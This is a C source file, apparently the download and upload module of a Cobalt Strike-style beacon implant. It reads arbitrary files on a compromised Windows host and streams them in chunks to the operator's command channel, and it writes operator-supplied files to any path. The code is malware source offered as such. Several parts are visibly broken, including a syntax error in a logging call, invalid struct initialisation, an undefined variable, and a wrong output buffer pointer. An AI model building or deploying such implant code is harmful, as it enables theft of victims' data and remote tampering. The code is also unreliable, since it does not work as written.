#include "pch.h"

#include "download.h"

#include "beacon.h"

typedef struct DOWNLOAD_ENTRY
{
	int fid;
	int remainingData;
	FILE* file;
	struct DOWNLOAD_ENTRY* next;
} DOWNLOAD_ENTRY;

DOWNLOAD_ENTRY* gDownloads = NULL;
int gDownloadFid = 0;

void DownloadCancel(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int fid = BeaconDataInt(&parser);
	for (DOWNLOAD_ENTRY* download = gDownloads; download; download = download->next)
	{
		if (download->fid == fid)
		{
			download->remainingData = 0;
			fclose(download->file);
		}
	}
}

void DownloadDo(char* buffer, int length)
{
#define MAX_FILENAME 2048
#define MAX_BUFFER 2048

	datap* locals = BeaconDataAlloc(MAX_FILENAME + MAX_BUFFER);
	char* lpFileName = BeaconDataPtr(locals, MAX_FILENAME);
	char* lpBuffer = BeaconDataPtr(locals, MAX_BUFFER);

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	BeaconDataStringCopy(&parser, lpFileName, MAX_FILENAME);

	FILE* file = fopen(lpFileName, "rb");
	if (file == INVALID_HANDLE_VALUE || file == NULL)
	{
		LERROR("Could not open '%s'", lpFileName);
		BeaconErrorS(ERROR_DOWNLOAD_OPEN_FAILED, lpFileName);
		goto cleanup;
	}

	fseek(file, 0, SEEK_END);
	long long fileSize = _ftelli64(file);
	fseek(file, 0, SEEK_SET);

	if (fileSize == INVALID_FILE_SIZE)
	{
		LERROR("File '%s' is either too large (>4GB) or size check failed");
		BeaconErrorS(ERROR_DOWNLOAD_SIZE_CHECK_FAILED, lpFileName);

		fclose(file);
		goto cleanup;
	}

	fileSize = (int)fileSize; // Now this truncates to 32-bit safely

	int fullPathSize = GetFullPathNameA(lpFileName, MAX_FILENAME, lpBuffer, NULL);
	if (fullPathSize > MAX_FILENAME)
	{
		LERROR("Could not determine full path of '%s'"; , lpFileName);
		BeaconErrorS(ERROR_DOWNLOAD_PATH_TOO_LONG, lpFileName);

		fclose(file);
		goto cleanup;
	}

	DOWNLOAD_ENTRY* download = malloc(sizeof(DOWNLOAD_ENTRY));
	*download = DOWNLOAD_ENTRY{
		.fid = gDownloadFid++,
		.remainingData = fileSize,
		.file = file,
		.next = gDownloads
	};
	gDownloads = download;

	formatp format;
	BeaconFormatAlloc(&format, MAX_FILENAME + MAX_BUFFER);
	BeaconFormatInt(&format, download->fid);
	BeaconFormatInt(&format, fileSize);
	BeaconFormatAppend(&format, lpBuffer, fullPathSize);

	int cbLength = BeaconDataLength(&format);
	char* cbBuffer = BeaconDataOriginal(&format);
	BeaconOutput(CALLBACK_FILE, cbBuffer, cbLength);

	BeaconFormatFree(&format);

	cleanup:
	BeaconDataFree(locals);
}

void Upload(char* buffer, int length, char* mode)
{
	char* lpFileName = malloc(0x400);
	if(lpFileName == NULL)
		return;

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int filenameSize = BeaconDataStringCopySafe(&parser, lpFileName, 0x400);
	if (filenameSize == 0)
		goto cleanup;

	FILE* file = fopen(lpFileName, mode);
	if (file == INVALID_HANDLE_VALUE || file == NULL)
	{
		DWORD lastError = GetLastError();
		LERROR("Could not upload file: %s", LAST_ERROR_STR(error));
		BeaconErrorD(ERROR_UPLOAD_OPEN_FAILED, lastError);
		goto cleanup;
	}

	int remaining = BeaconDataLength(&parser);
	char* data = BeaconDataBuffer(&parser);
	fwrite(data, sizeof(char), remaining, file);
	fclose(file);

	cleanup:
	free(lpFileName);
}

void DownloadCloseSafely(DOWNLOAD_ENTRY* download)
{
	if (download->remainingData != 0)
		return;

	int id = htonl(download->fid);
	BeaconOutput(CALLBACK_FILE_CLOSE, (char*)&id, sizeof(int));
	fclose(download->file);
}

typedef struct DOWNLOAD_CHUNK
{
	int fid;
	char remainingData[0x80000];
} DOWNLOAD_CHUNK;

void DownloadFileChunk(DOWNLOAD_ENTRY* download, int chunkMaxSize)
{
	static DOWNLOAD_CHUNK* gDownloadChunk;

	if(gDownloadChunk)
		return;

	gDownloadChunk = malloc(sizeof(DOWNLOAD_CHUNK));
	gDownloadChunk->fid = htonl(download->fid);
	int toRead = min(chunkMaxSize, download->remainingData);

	int totalRead = 0;
	while (toRead)
	{
		const int read = fread(gDownloadChunk->remainingData + totalRead, 1, toRead, download->file);
		if (!read)
		{
			download->remainingData = 0;
			break;
		}

		download->remainingData -= read;
		totalRead += read;
		toRead -= read;
	}

	BeaconOutput(CALLBACK_FILE_WRITE, (char*)&gDownloadChunk, totalRead + sizeof(int));
	DownloadCloseSafely(download);
}

void DownloadHandleAll(int chunkMaxSize)
{
	DOWNLOAD_ENTRY* prev = NULL;
	for (DOWNLOAD_ENTRY* download = gDownloads; download; download = download->next)
	{
		if (download->remainingData == 0)
		{
			if (prev == NULL)
			{
				gDownloads = download->next;
				free(download);
				return;
			}
			prev->next = download->next;
			free(download);
		}
		else
		{
			DownloadFileChunk(download, chunkMaxSize);
			prev = download;
		}
	}
}
